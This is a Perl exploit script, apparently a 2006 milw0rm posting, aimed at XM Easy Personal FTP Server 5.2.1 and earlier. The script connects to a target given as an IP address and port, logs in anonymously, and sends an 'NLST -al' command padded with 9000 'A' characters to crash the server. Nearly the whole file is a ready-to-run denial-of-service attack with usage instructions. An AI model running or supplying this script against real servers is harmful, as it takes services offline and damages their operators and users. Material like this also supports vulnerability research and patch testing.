#!/usr/bin/perl
#
# *
# * Title: XM Easy Personal FTP Server <= 5.2.1 'NLST -al' Remote Denial of Service
# * Author: boecke
# * Discovery: boecke
# * Vulnerability Type: Remote Denial of Service
# * Risk: Low Risk (Requires valid
# * Software Affected: XM Easy Personal FTP Server <= 5.2.1
# * Greetings: henrik, str0ke!
# *
#

use IO::Socket;

$commandToSend = "NLST -al ";
$remoteUsername = "anonymous";
$remotePassword = "borat\@kik.com";
$remotePort = $ARGV[1];

sub bannerExploit()
{
       print "\n x XM Easy Personal FTP Server <= v5.2.1 Remote Denial of Service\n";
       print " x Author: boecke\n x Discovery: boecke (boecke [at] herzeleid [dot] net)\n\n";
}

if ( @ARGV < 2 )
{
       bannerExploit();

       print " * Usage: perl ftp.pl 192.168.0.1 21\n\n";

       exit;
}

if ($socket = IO::Socket::INET->new( PeerAddr => $ARGV[0], PeerPort => $remotePort, Proto => "TCP" ))
{
       bannerExploit();

       print " + Establishing connection at " . $ARGV[0] . ":" . $remotePort . "\n";

       print $socket "USER " . $remoteUsername . "\r\n";

       print " * FTP Username: \'" . $remoteUsername . "\'\n";

       sleep( 1 );

       print $socket "PASS " . $remotePassword . "\r\n";

       print " * FTP Password: \'" . $remotePassword . "\'\n";

       print $socket $commandToSend . "A" x 9000 . "\r\n";

       sleep( 3 );

       print $socket "QUIT\r\n";

       print " + Sent 9000 bytes of data to $ARGV[0]:$remotePort\n\n";
}
else
{
       bannerExploit();

       print " + Failed to establish connection to " . $ARGV[0] . ":" . $remotePort . "\n";

}

# milw0rm.com [2006-11-04]
